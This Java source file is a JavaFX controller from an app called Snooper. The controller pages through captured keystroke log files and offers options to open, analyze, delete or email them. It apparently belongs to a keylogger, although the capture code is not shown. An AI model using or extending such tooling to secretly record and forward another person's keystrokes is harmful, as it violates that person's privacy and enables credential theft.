package com.snooper.app.controller;

import com.snooper.*;
import com.snooper.tray.*;
import com.snooper.app.*;

import javafx.fxml.FXML;
import javafx.scene.control.*;
import javafx.collections.*;
import java.io.*;
import java.util.*;
import javafx.scene.input.*;

public class SnoopLogsController extends Controller {
	
	@FXML ListView<SLogFile> sLogListView;
	@FXML ListView<SnoopKey> keyLogsListView;
	
	@FXML Button sLogLeftButton;
	@FXML Button sLogRightButton;
	@FXML Label sLogMaxPageLabel;
	@FXML TextField sLogPageTextField;
	
	@FXML Button keyLogLeftButton;
	@FXML Button keyLogRightButton;
	@FXML Label keyLogMaxPageLabel;
	@FXML Label sLogFileSelectedLabel;
	@FXML TextField keyLogPageTextField;
	
	public static final int MAX_KEYLOG_CONTENT_PER_PAGE = 10;
	public static final int MAX_SLOG_CONTENT_PER_PAGE = 6;
	
	private ObservableList<SLogFile> sLogFilesContents;
	private SLogFile[] sLogFiles;
	private int sLogPages;
	
	private int selectedSLogIndex;
	private int selectedKeyLogIndex;
	
	private int currentSLogPage;
	private int currentKeyLogPage;
	
	private SnoopReader sReader;
	private ObservableList<SnoopKey> keyLogsContents;
	private int keyLogPages;
	
	private boolean sameSLogIndex;
	
	@FXML
	public void initialize() {
		System.out.println("INIT: SnoopLogController.java");
		
		currentSLogPage = 1;
		currentKeyLogPage = 1;
		selectedSLogIndex = 0;
		sameSLogIndex = false;
		
		sLogListView.setCellFactory(param -> {
			ListCell<SLogFile> cell = new ListCell<SLogFile>() {
				@Override
				protected void updateItem(SLogFile item, boolean empty) {
					super.updateItem(item,empty);
					if (item != null) {
						setGraphic(item.getHBox(item.equals(sLogFiles[selectedSLogIndex])));
					} else {
						setGraphic(null);
					}
				}
			};
			
			//one more reason we made a cell factory is to control the cells to that when clicked on empty nothing happens
			cell.setOnMouseClicked((MouseEvent mouseEvent) -> {
				if (cell.isEmpty()) mouseEvent.consume();
			});
			
			//context menu
			ContextMenu contextMenu = new ContextMenu();
			MenuItem selectMenuItem = new MenuItem("Select");
			MenuItem openInDefaultMenuItem = new MenuItem("Open in default app");
			MenuItem sendEmailMenuItem = new MenuItem("Send email");
			MenuItem analyzeMenuItem = new MenuItem("Analyze");
			MenuItem deleteFileMenuItem = new MenuItem("Delete");
			
			contextMenu.getItems().addAll(
				selectMenuItem,
				openInDefaultMenuItem,
				sendEmailMenuItem,
				analyzeMenuItem,
				deleteFileMenuItem
			);
			
			selectMenuItem.setOnAction(event -> {
				selectSLog();
			});
			
			openInDefaultMenuItem.setOnAction(event -> {
				Util.openFileDefault(cell.getItem().getFile());
			});
			
			sendEmailMenuItem.setOnAction(event -> {
				Popup popup = new Popup(KSApplication.createLoader(Popup.EMAIL_POPUP_FXML));
				popup.sendToController(cell.getItem());
				popup.showAndWait();
			});
			
			analyzeMenuItem.setOnAction(event -> {
				Popup popup = new Popup(KSApplication.createLoader(Popup.ANALYZE_POPUP_FXML));
				SLogFile sLogFile = cell.getItem();
				if (sLogFile.isValid()) {
					popup.sendToController(sLogFile);
					popup.show();
				} else {
					Util.notif("Failed to analyze, sLogFile is empty: " + sLogFile.getFilename());
				}
			});
			
			deleteFileMenuItem.setOnAction(event -> {
				cell.getItem().getFile().delete(); //this will not delete temp cause it is opened
				refreshSLogs();
			});
			
			cell.emptyProperty().addListener((o,wasEmpty,isEmpty) -> {
				if (isEmpty) {
					cell.setContextMenu(null);
				} else {
					cell.setContextMenu(contextMenu);
				}
			});
			
			return cell;
		});
		
		sLogListView.setOnMouseClicked((mouseEvent) -> {
			final SLogFile sLogFile = sLogListView.getSelectionModel().getSelectedItem();
			
			if (mouseEvent.getButton() == MouseButton.PRIMARY && mouseEvent.getClickCount() == 2) {
				System.out.println("LEFT CLICKED x 2: " + sLogFile);//TODO remove
				
				selectSLog();
			}
		});
		
		sLogPageTextField.textProperty().addListener((o,ov,nv) -> {
			int page = -1;
			if (Util.tryParseInt(nv)) {
				page = Integer.parseInt(nv);
				if (Util.withinRange(1,sLogPages,page)) {
					setSLogPage(page);
					return;
				}
			}
			
			sLogPageTextField.setText(ov); //set old value if not valid page number
		});
		
		keyLogPageTextField.textProperty().addListener((o,ov,nv) -> {
			int page = -1;
			if (Util.tryParseInt(nv)) {
				page = Integer.parseInt(nv);
				if (Util.withinRange(1,keyLogPages, page)) {
					setKeyLogPage(page);
					return;
				}
			}
			keyLogPageTextField.setText(ov); //set old value if not valid page number
		});
		
		loadSLogs();
		setSLogPage(currentSLogPage);
	}
	
	private void selectSLog() {
		int oldSelectedSLogIndex = selectedSLogIndex;
		selectedSLogIndex = getSelectedSLogIndex();
				
		reloadSLogPage();
		
		//for click then start on page 1 else if clicked the selected then should load same key log page
		if (oldSelectedSLogIndex == selectedSLogIndex) sameSLogIndex = true;
		else sameSLogIndex = false;
		
		loadKeyLogs(selectedSLogIndex);
	}
	
	public void loadSLogs() {
		File[] files = Util.getSLogFiles(Snooper.FOLDER);
		int length = files.length;
		sLogFiles = new SLogFile[length];
		for (int i = 0; i < length; i++) {
			sLogFiles[i] = new SLogFile(files[length - i - 1]); //to reverse while copying - latest to old
		}
		
		sLogFilesContents = FXCollections.observableArrayList();
		
		this.sLogPages = (int)Math.ceil((double)length / MAX_SLOG_CONTENT_PER_PAGE);
		sLogMaxPageLabel.setText("/" + sLogPages);
		
		//fix for an error
		if (!Util.withinRange(1,sLogPages, currentSLogPage)) {
			currentSLogPage = sLogPages;
		}
		
		int endIndex = length - 1;
		if (!Util.withinRange(0,endIndex, selectedSLogIndex)) {
			selectedSLogIndex = endIndex;
		}
	}
	
	public void setSLogPage(int page) {
		this.currentSLogPage = page;
		sLogPageTextField.setText("" + page);
		
		if (sLogPages == 0 || currentSLogPage == 1) {
			sLogLeftButton.setDisable(true);
		} else {
			sLogLeftButton.setDisable(false);
		}
		
		if (sLogPages == 0 || currentSLogPage == sLogPages) {
			sLogRightButton.setDisable(true);
		} else {
			sLogRightButton.setDisable(false);
		}
		
		int start = (currentSLogPage - 1) * MAX_SLOG_CONTENT_PER_PAGE;
		int end = start + MAX_SLOG_CONTENT_PER_PAGE;
		sLogFilesContents.clear(); //remove previous on list view
		for (int i = start; i < sLogFiles.length && i < end; i++) {
			sLogFilesContents.add(sLogFiles[i]);
		}
		
		displaySLogs();
		sameSLogIndex = true;
		
		loadKeyLogs(selectedSLogIndex);
	}
	
	public void reloadSLogPage() {
		setSLogPage(currentSLogPage);
	}
	
	public void displaySLogs() {
		sLogListView.setItems(sLogFilesContents);
	}
	
	private int getSelectedSLogIndex() {
		int start = (currentSLogPage - 1) * MAX_SLOG_CONTENT_PER_PAGE;
		int index = sLogListView.getSelectionModel().getSelectedIndex();
		return start + index;
	}
	
	@FXML
	private void sLogLeft() {
		if (currentSLogPage <= 1) return;
		setSLogPage(--currentSLogPage);
	}
	
	@FXML
	private void sLogRight() {
		if (currentSLogPage >= sLogPages) return;
		setSLogPage(++currentSLogPage);
	}
	
	@FXML
	private void refreshSLogs() {
		sameSLogIndex = true;
		loadSLogs();
		setSLogPage(currentSLogPage);
	}
	
	public void loadKeyLogs(int index) {
		final SLogFile sLogFile = sLogFiles[index];
		sReader = new SnoopReader(sLogFile);
		sLogFileSelectedLabel.setText(sLogFile.toString());
		
		keyLogsContents = FXCollections.observableArrayList();
		this.keyLogPages = (int)Math.ceil((double)sReader.getSnoopKeysSize() / MAX_KEYLOG_CONTENT_PER_PAGE);
		keyLogMaxPageLabel.setText("/" + keyLogPages);
		setKeyLogPage((sameSLogIndex) ? currentKeyLogPage : 1);
	}
	
	public void setKeyLogPage(int page) {
		this.currentKeyLogPage = page;
		keyLogPageTextField.setText("" + page);
		
		if (keyLogPages == 0 || currentKeyLogPage == 1) {
			keyLogLeftButton.setDisable(true);
		} else {
			keyLogLeftButton.setDisable(false);
		}
		
		if (keyLogPages == 0 || currentKeyLogPage == keyLogPages) {
			keyLogRightButton.setDisable(true);
		} else {
			keyLogRightButton.setDisable(false);
		}
		
		int start = (currentKeyLogPage - 1) * MAX_KEYLOG_CONTENT_PER_PAGE;
		int end = start + MAX_KEYLOG_CONTENT_PER_PAGE;
		keyLogsContents.clear();
		for (int i = start; i < sReader.getSnoopKeysSize() && i < end; i++) {
			keyLogsContents.add(sReader.getSnoopKey(i));
		}
		
		displayKeyLogs();
	}
	
	private void displayKeyLogs() {
		keyLogsListView.setItems(keyLogsContents);
	}
	
	@FXML
	private void keyLogLeft() {
		if (currentKeyLogPage <= 1) return;
		setKeyLogPage(--currentKeyLogPage);
	}
	
	@FXML
	private void keyLogRight() {
		if (currentKeyLogPage >= keyLogPages) return;
		setKeyLogPage(++currentKeyLogPage);
	}
	
}